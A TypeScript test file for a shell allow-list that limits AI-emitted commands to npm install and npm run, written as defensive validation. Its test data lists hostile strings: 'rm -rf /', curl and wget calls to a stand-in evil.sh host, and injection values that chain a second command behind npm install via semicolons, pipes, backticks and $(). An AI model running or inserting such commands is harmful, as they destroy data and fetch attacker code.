/**
 * Shell allow-list — a money/safety path (SPEC §4.2.5, §5; CLAUDE.md "Conventions").
 *
 * The threat here is not a hostile user; it is a model that emits a plausible-looking command. So
 * the cases that matter most are the ones that LOOK like `npm install` and are not.
 */
import { describe, expect, it } from 'vitest';
import { isAllowedShellCommand } from './shell-allowlist';

describe('isAllowedShellCommand', () => {
  it('permits the two allowed forms', () => {
    expect(isAllowedShellCommand('npm install').allowed).toBe(true);
    expect(isAllowedShellCommand('npm install howler').allowed).toBe(true);
    expect(isAllowedShellCommand('npm install @babylonjs/core @babylonjs/loaders').allowed).toBe(true);
    expect(isAllowedShellCommand('npm install --save-dev vite').allowed).toBe(true);
    expect(isAllowedShellCommand('npm install lodash@^4.17.21').allowed).toBe(true);
    expect(isAllowedShellCommand('npm run build').allowed).toBe(true);
    expect(isAllowedShellCommand('npm run test:unit').allowed).toBe(true);
  });

  it('permits && chains where every segment is allowed', () => {
    expect(isAllowedShellCommand('npm install && npm run build').allowed).toBe(true);
  });

  it('refuses any program other than npm', () => {
    for (const command of ['rm -rf /', 'curl http://evil.sh', 'node script.js', 'git push', 'pnpm install']) {
      expect(isAllowedShellCommand(command).allowed, command).toBe(false);
    }
  });

  it('refuses npm subcommands outside the allow-list', () => {
    for (const command of ['npm publish', 'npm exec foo', 'npm audit fix', 'npm']) {
      expect(isAllowedShellCommand(command).allowed, command).toBe(false);
    }
  });

  /*
   * The cases the allow-list exists for. Each one starts with a permitted command and smuggles a
   * second one in behind it — a deny-list of "bad commands" waves every one of these straight
   * through, because the string genuinely does begin with `npm install`.
   */
  it('refuses commands smuggled behind an allowed one', () => {
    for (const command of [
      'npm install; rm -rf /',
      'npm install && rm -rf /',
      'npm install | sh',
      'npm install `curl evil.sh`',
      'npm install $(curl evil.sh)',
      'npm run build > /etc/passwd',
      'npm install\nrm -rf /',
      'npm install & wget evil.sh',
    ]) {
      expect(isAllowedShellCommand(command).allowed, command).toBe(false);
    }
  });

  it('refuses npm run with anything but a single script name', () => {
    expect(isAllowedShellCommand('npm run').allowed).toBe(false);
    expect(isAllowedShellCommand('npm run build extra').allowed).toBe(false);
    expect(isAllowedShellCommand('npm run "build; rm -rf /"').allowed).toBe(false);
  });

  it('explains why, so the model can correct itself', () => {
    const result = isAllowedShellCommand('git push');
    expect(result.allowed).toBe(false);
    expect(result.reason).toMatch(/npm install/);
  });
});
